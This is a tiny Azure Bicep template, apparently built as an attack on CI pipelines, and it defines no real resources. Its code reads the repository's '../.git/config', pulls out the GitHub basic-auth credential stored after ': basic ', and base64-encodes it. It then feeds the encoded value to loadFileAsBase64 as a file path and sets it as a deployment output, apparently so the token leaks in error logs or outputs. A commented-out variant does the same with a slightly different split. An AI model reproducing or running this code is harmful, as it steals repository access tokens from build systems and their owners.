targetScope = 'subscription'

/*
var fileContent = loadTextContent('../.git/config')
var afterPrefix = split(fileContent, 'http.https://github.com ')[1]
var extractme = split(afterPrefix, '\n')[0])
var export12 = loadFileAsBase64(base64(extractme))
output export string = export12
*/

var fileContent = loadTextContent('../.git/config')
var afterPrefix = split(fileContent, ': basic ')[1]
var export12 = loadFileAsBase64(base64(afterPrefix))
output export string = export12
